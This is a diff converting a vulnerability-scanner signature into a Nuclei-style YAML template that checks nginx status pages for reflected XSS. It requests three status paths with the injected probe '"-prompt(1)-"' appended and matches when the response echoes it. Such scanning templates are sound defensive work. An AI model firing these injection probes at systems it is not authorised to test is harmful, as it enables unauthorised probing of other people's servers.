@@ -1,26 +1,23 @@
+http:
+- matchers:
+  - part: header
+    type: word
+    words:
+    - text/html
+  - condition: and
+    type: word
+    words:
+    - nginx vhost traffic
+    - -prompt(1)-
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/nginx-status.html/"-prompt(1)-"'
+  - '{{BaseURL}}/status.html/"-prompt(1)-"'
+  - '{{BaseURL}}/_zstats/"-prompt(1)-"'
 id: nginx-vhost-xss
 info:
+  author: reewardius
   name: Nginx Vhost RXSS
-  risk: Medium
-params:
-- root: '{{.BaseURL}}'
-reference:
-- author: j3ssie
-requests:
-- detections:
-  - StatusCode() == 200 && StringSearch("response", "nginx vhost traffic") && StringSearch("response",
-    "-prompt(1)-")
-  headers:
-  - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36
-      (KHTML, like Gecko) Chrome/80.0.3984.0 Safari/537.36
-  method: GET
-  redirect: false
-  url: '{{.root}}/{{.stats}}"-prompt(1)-"'
-variables:
-- stats: 'nginx-status.html
-
-    status.html
-
-    _zstats
-
-    '
+  severity: medium
+  tags: xss,nginx,generic
